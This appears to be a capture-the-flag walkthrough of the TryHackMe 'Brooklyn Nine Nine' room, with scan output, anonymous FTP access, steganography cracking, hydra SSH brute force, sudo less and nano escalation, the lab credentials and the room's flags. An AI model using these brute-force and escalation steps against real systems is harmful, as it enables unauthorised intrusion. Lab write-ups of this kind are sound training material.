<a href="https://tryhackme.com/room/brooklynninenine"><img src="../../images/THMlogo.png" alt="tryhackme" width="200"/></a>

# brooklyn nine nine

## rustscan and nmap

### initial

rustscan $IP --ulimit 5000

```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/karti/.config/rustscan/config.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.73.230:21
Open 10.10.73.230:22
Open 10.10.73.230:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 21,22,80 10.10.73.230

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 16:45 BST
Initiating Ping Scan at 16:45
Scanning 10.10.73.230 [2 ports]
Completed Ping Scan at 16:45, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:45
Completed Parallel DNS resolution of 1 host. at 16:45, 0.00s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:45
Scanning 10.10.73.230 [3 ports]
Discovered open port 21/tcp on 10.10.73.230
Discovered open port 80/tcp on 10.10.73.230
Discovered open port 22/tcp on 10.10.73.230
Completed Connect Scan at 16:45, 0.02s elapsed (3 total ports)
Nmap scan report for 10.10.73.230
Host is up, received syn-ack (0.018s latency).
Scanned at 2020-09-14 16:45:07 BST for 0s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
```
### all ports

nmap -A -sC -sV $IP -p-
```shell
nmap -A -sC -sV 10.10.73.230
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 16:47 BST
Nmap scan report for 10.10.73.230
Host is up (0.019s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.12.213
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds
```
## nikto

nikto -h $IP -Display 2
```shell
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.73.230
+ Target Hostname:    10.10.73.230
+ Target Port:        80
+ Start Time:         2020-09-14 16:44:44 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2ce, size: 5a5ee14bb8d76, mtime: gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7903 requests: 12 error(s) and 7 item(s) reported on remote host
+ End Time:           2020-09-14 16:52:54 (GMT1) (490 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
## gobuster

### initial
gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt
```shell
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.73.230
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/14 16:44:43 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/09/14 16:44:57 Finished
===============================================================
```
### secondary

gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```shell

```
## website

### robots.txt - no file found

```shell

```
### cookies - no cookies found

```shell

```
### sourcecode

```html
<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
</body>
</html>
```
### images
```html
wget http://10.10.73.230/brooklyn99.jpg
--2020-09-14 16:55:21--  http://10.10.73.230/brooklyn99.jpg
Connecting to 10.10.73.230:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 69685 (68K) [image/jpeg]
Saving to: ‘brooklyn99.jpg’

brooklyn99.jpg               100%[============================================>]  68.05K   108KB/s    in 0.6s    

2020-09-14 16:55:37 (108 KB/s) - ‘brooklyn99.jpg’ saved [69685/69685]
```

## initial summary
After the external review of the server, we have the following to look though.

1. 3 ports - 21, 22 and 80 - 21 with anonymous login.
1. 1 image, where the source code highlighted steganography.

## ftp
```shell
ftp 10.10.220.170
Connected to 10.10.220.170.
220 (vsFTPd 3.0.3)
Name (10.10.220.170:karti): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17 23:17 .
drwxr-xr-x    2 0        114          4096 May 17 23:17 ..
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
get note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.07 secs (1.6363 kB/s)
ftp> 
```
### note to jake

```
cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
##steganography

Starting through my usual don't miss a trick list we eventually end up with a password!

1. file
1. strings
1. exiftool
1. binwalk
1. steghide
1. stegsolve
1. stegcracker

```shell
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt 
StegCracker 2.0.8 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2020 - Luke Paris (Paradoxis)

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20651 passwords
Your file has been written to: brooklyn99.jpg.out
admin
karti@kali-pt:/media/sf_CTF/tryhackme/nine-nine$ ls
brooklyn99.jpg  brooklyn99.jpg.out  nine-nine.md  nmap
karti@kali-pt:/media/sf_CTF/tryhackme/nine-nine$ cat brooklyn99.jpg.out 
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

## secondary summary

Going through our initial review, we now have a few usernames (assumptions), as well as a password.


## ssh
```shell
hydra -t 20 -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.220.170
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-14 19:20:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 20 tasks per 1 server, overall 20 tasks, 14344399 login tries (l:1/p:14344399), ~717220 tries per task
[DATA] attacking ssh://10.10.220.170:22/
[22][ssh] host: 10.10.220.170   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-14 19:20:42
```
So we now have Jake's and Holt's password for ssh. Let's logon and see what we can find.

First of all Holt.
```script
ssh holt@10.10.220.170
holt@10.10.220.170's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ ls
nano.save  user.txt
holt@brookly_nine_nine:~$ cat user.txt 
ee11cbb19052e40b07aac0ca060c23ee
```
Now what can he do with sudo -l
```script
sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```
So all we need to do now is read the root file with the /bin/nano /root/root.txt command

What about jack.
```script
jake@brookly_nine_nine:/home$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:/home/holt$ /usr/bin/less /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845
```

This is the first time I used my new draft template for working through the room, and I may even give it a 1.0 version if it keeps this up :)

This room was created by [Fsociety2006](https://tryhackme.com/p/Fsociety2006) and one I really enjoyed not just because of the 99 show but also the learning value.

Thanks Fsociety2006 for your time.

Regards

Karti

<script src="https://tryhackme.com/badge/65208"></script>







